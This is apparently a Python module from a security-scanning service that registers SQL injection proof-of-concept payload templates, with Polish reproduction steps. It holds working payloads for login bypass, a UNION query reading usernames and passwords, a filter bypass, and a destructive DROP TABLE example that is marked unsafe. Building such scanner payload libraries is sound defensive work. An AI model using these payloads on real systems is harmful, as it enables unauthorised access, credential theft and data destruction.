"""Safe SQL-injection PoC payloads — Epic 4, Story 4.10.

Canonical, non-destructive demonstrations of SQLi (auth bypass / data read).
A destructive ``DROP TABLE`` example is recorded as unsafe for documentation only
and is never served.
"""

from app.services.security_scan.poc_payloads.registry import PayloadTemplate, register

_VULN = "sql_injection"

register(
    _VULN,
    PayloadTemplate(
        label="auth-bypass",
        payload="' OR 1=1--",
        reproduction_steps=(
            "1. Otwórz formularz logowania lub endpoint przyjmujący parametr używany w zapytaniu SQL.",
            "2. W polu (np. username) wpisz: ' OR 1=1--",
            "3. Zatwierdź żądanie i obserwuj odpowiedź.",
        ),
        expected_effect="Warunek WHERE staje się zawsze prawdziwy — logowanie bez znajomości hasła lub zwrócenie wszystkich rekordów.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="data-extraction-union",
        payload="' UNION SELECT NULL, username, password FROM users--",
        reproduction_steps=(
            "1. Zidentyfikuj parametr wstrzykiwany do zapytania SELECT.",
            "2. Dołącz payload UNION, dopasowując liczbę kolumn.",
            "3. Obserwuj, czy w odpowiedzi pojawiają się dane z innej tabeli.",
        ),
        expected_effect="Zapytanie zwraca dane z tabeli users (np. loginy) w wynikach oryginalnego zapytania.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="string-bypass",
        payload='" OR ""="',
        reproduction_steps=(
            "1. Otwórz pole filtrujące/wyszukujące oparte o zapytanie SQL.",
            '2. Wpisz: " OR ""="',
            "3. Obserwuj, czy zwracane są wszystkie rekordy.",
        ),
        expected_effect="Warunek tekstowy zawsze prawdziwy — obejście filtra i zwrócenie pełnego zbioru.",
    ),
)

# Documentation-only, destructive example — NEVER served (safe=False).
register(
    _VULN,
    PayloadTemplate(
        label="destructive-example",
        payload="1; DROP TABLE users--",
        reproduction_steps=("Przykład destrukcyjny — nieużywany.",),
        expected_effect="Usunięcie tabeli — zablokowane przez walidator bezpieczeństwa.",
        safe=False,
    ),
)
